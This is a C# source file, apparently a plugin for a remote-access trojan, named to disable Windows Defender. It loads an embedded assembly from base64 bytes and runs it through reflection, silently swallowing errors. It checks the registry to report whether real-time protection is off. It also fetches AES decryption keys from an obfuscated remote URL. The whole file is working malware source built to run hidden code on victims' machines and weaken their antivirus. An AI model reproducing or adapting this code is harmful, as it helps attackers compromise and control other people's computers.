using Microsoft.Win32;
using System;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Plugin.Handler
{
    class HandleDisableDefender
    {
        public void Run()
        {
            //with love
            Byte[] kbbytes = Convert.FromBase64String("");
            Task.Factory.StartNew(() => platsaplutsa(kbbytes)).Wait();
            Packet.Log("WD Status:" + isrunning());
        }

        public static string isrunning()
        {
            string running;
            var path = @"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection";
            var key = "DisableRealtimeMonitoring";
            var regkey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            if (regkey != null)
            {
                var subkey = regkey.OpenSubKey(path);
                var val = subkey.GetValue(key);
                if (val != null && val is Int32)
                {
                    var value = (int)val;
                    if (value == 1)
                    {
                        running = "Protection is off";
                    }
                    else
                    {
                        running = "Protection is on";
                    }
                }
                else
                {
                    running = "Protection is on";
                }
            }
            else
            {
                running = "key is not found";
            }

            return running;
        }
        public static string Decrypts(string encrypted)
        {
            // using System.Net;
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            // Use SecurityProtocolType.Ssl3 if needed for compatibility reasons
            using (WebClient client = new WebClient())
            {
                client.Proxy = null;
                var Key = client.DownloadString(Encoding.UTF8.GetString(
                    Convert.FromBase64String(
                        "aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2tleVNTLnR4dA==")));
                var IV = client.DownloadString(Encoding.UTF8.GetString(
                    Convert.FromBase64String(
                        "aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2l2U1MudHh0")));

                byte[] encbytes = Convert.FromBase64String(encrypted);
                AesCryptoServiceProvider encdec = new AesCryptoServiceProvider();
                encdec.BlockSize = 128;
                encdec.KeySize = 256;
                encdec.Key = ASCIIEncoding.ASCII.GetBytes(reupload(Key));
                encdec.IV = ASCIIEncoding.ASCII.GetBytes(reupload(IV));
                encdec.Padding = PaddingMode.PKCS7;
                encdec.Mode = CipherMode.CBC;

                ICryptoTransform icrypt = encdec.CreateDecryptor(encdec.Key, encdec.IV);

                byte[] dec = icrypt.TransformFinalBlock(encbytes, 0, encbytes.Length);
                icrypt.Dispose();

                return ASCIIEncoding.ASCII.GetString(dec);
            }
        }
        public static void platsaplutsa(byte[] purdi)
        {
            try
            {
                Assembly asm = AppDomain.CurrentDomain.Load((byte[])purdi);
                MethodInfo Metinf = Entry(asm);
                object InjObj = asm.CreateInstance(Metinf.Name);
                object[] parameters = new object[1];
                if (Metinf.GetParameters().Length == 0)
                    parameters = null;
                MethodInfo(Metinf, InjObj, parameters);
            }
            catch { }
        }
        private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
        {
            if (meth != null)
                return meth.Invoke(obj1, obj2);
            else
                return false;
        }
        private static string reupload(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }
            return stringBuilder.ToString();
        }
        private static MethodInfo Entry(Assembly obj)
        {
            if (obj != null)
                return obj.EntryPoint;
            else
                return null;
        }

    }
}
